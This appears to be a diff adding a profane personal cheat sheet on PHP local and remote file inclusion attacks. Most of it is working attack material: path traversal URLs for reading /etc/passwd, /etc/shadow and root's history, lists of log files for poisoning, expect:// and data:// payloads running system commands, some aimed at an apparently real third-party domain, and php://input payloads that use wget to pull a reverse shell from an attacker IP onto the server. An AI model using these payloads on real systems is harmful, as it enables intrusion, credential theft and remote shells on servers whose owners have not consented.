@@ -1,0 +1,101 @@
+File inclusion are of two types : fucking obvious
+	1. Local file inclusion
+	2. Remote file inclusion
+
+Local file inclusion: so basically local file inclusion occurs when the web application is asking for a file input and there are no proper sanitization. It will look like this $file = $_GET['file']; 
+But in this,allow url include will be turned off that means we cannot include URLs otherwise this will beome our remote include
+
+So lets say you found out a Local file inclusion attack with this
+http://example.com/?file=../../../../etc/passwd
+Or this can 
+http://example.com/some.php?page=../../../../../etc/passwd
+
+You can look for all these files
+/etc/issue
+– /proc/version
+– /etc/profile
+– /etc/passwd
+– /etc/passwd
+– /etc/shadow
+– /root/.bash_history
+– /var/log/dmessage
+– /var/mail/root
+– /var/spool/cron/crontabs/root
+
+
+So how can you get a shell after this let's find out:
+/proc/self/environ
+/proc/self/cmdline
+/proc/apm - Provides information on Advanced Power Management
+Proc/acpi
+Proc/stat
+/var/log/messages
+/var/log/auth.log = ssh log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+
+
+If the /proc/self/environ is working then we can include php error and then execute commands
+
+If /proc/self/cmdline is included then 
+Then /proc/self/fd/[id] - id can be between 0-10 and if any id found, then look for what files might be getting affected then inject that file with php script and use it to execute command
+
+Example:
+
+
+
+
+
+PHP Wrapper expect:// LFI
+Allows execution of system commands via the php expect wrapper, 
+http://127.0.0.1/fileincl/example1.php?page=expect://ls
+
+
+PHP Wrapper php://file
+Another PHP wrapper, php://input your payload is sent in a POST request using curl, burp or hackbar to provide the post data is probably the easiest option.
+
+
+
+<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
+
+
+PHP Wrapper php://filter
+
+http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+Using data:// wrapper
+http://www.zamenfeld.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
+
+http://www.zamenfeld.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
+
+http://www.zamenfeld.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
+
+
+Some Common log Files:=>
+
+/etc/httpd/logs/acces_log
+/etc/httpd/logs/acces.log
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log
+/var/log/apache/error_log
+/var/log/apache2/error_log
+/var/log/apache/error.log
+/var/log/apache2/error.log
+/var/log/error_log
+/var/log/error.log
+/var/www/logs/error_log
+/var/www/logs/error.log
+
+
+
+Remote file inclusion:
+The simplest way will be through python server and using it to open shell and listen on it
+
+But sometimes we need to upload the shell so 
+We'll use php://input method to upload a shell
+For example:
+http://10.11.1.8//internal/advanced_comment_system/admin.php?ACS_path=php://input%00
+And in post data:
+<?system('wget http://10.11.0.152/shell.php.txt -O /tmp/exploit.php');?>
+
+You can also try <?system('<any system commands>');?>
